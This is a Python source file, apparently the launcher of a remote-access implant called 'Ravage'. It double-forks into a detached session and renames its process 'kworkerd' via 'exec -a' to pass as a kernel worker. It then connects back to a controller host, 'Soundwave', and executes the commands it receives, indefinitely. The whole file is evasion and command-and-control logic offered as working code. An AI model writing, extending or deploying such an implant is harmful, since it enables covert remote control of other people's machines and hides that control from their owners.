import os
import subprocess

from . import config
from . import communication

PROCESS_NAME = 'kworkerd'


def main():
    config.SOUNDWAVE_IP = os.environ['SOUNDWAVE_IP']
    config.RAVAGE_IP = os.environ['RAVAGE_IP']
    config.COMMUNICATION_PORT = int(os.environ['COMMUNICATION_PORT'])
    config.RAVAGE_ROOT_DIR = os.environ['RAVAGE_ROOT_DIR']

    layer = int(os.environ.get('LAYER', '0'))
    os.environ['LAYER'] = str(layer + 1)

    if layer == 0:
        child = subprocess.Popen(
            ['python3', f'{os.path.dirname(__file__)}/entrypoint'],
            stdout=subprocess.PIPE
        )
        grand_child_pid = child.stdout.readline().decode()[:-1]
        print(f'Ravage: Running at {grand_child_pid}')

        if config.DEBUG:
            try:
                while True:
                    pass
            except KeyboardInterrupt:
                os.system(f'kill {grand_child_pid}')
        else:
            exit(0)

    elif layer == 1:
        grand_child = subprocess.Popen(
            ['bash'],
            stdin=subprocess.PIPE,
            start_new_session=True
        )

        print(grand_child.pid)

        grand_child.stdin.write(f'exec -a {PROCESS_NAME} python3\n'.encode())
        grand_child.stdin.flush()
        with open(f'{os.path.dirname(__file__)}/entrypoint', 'rb') as fh:
            grand_child.stdin.write(fh.read())
        grand_child.stdin.close()

    else:
        print('Hello from the grandchild')
        print('Ravage initialised and trying to connect back to Soundwave')

        communication.connect()
        print('Successfully connected to Soundwave')
        communication.process_commands_forever()
        communication.listen_for_commands_forever()
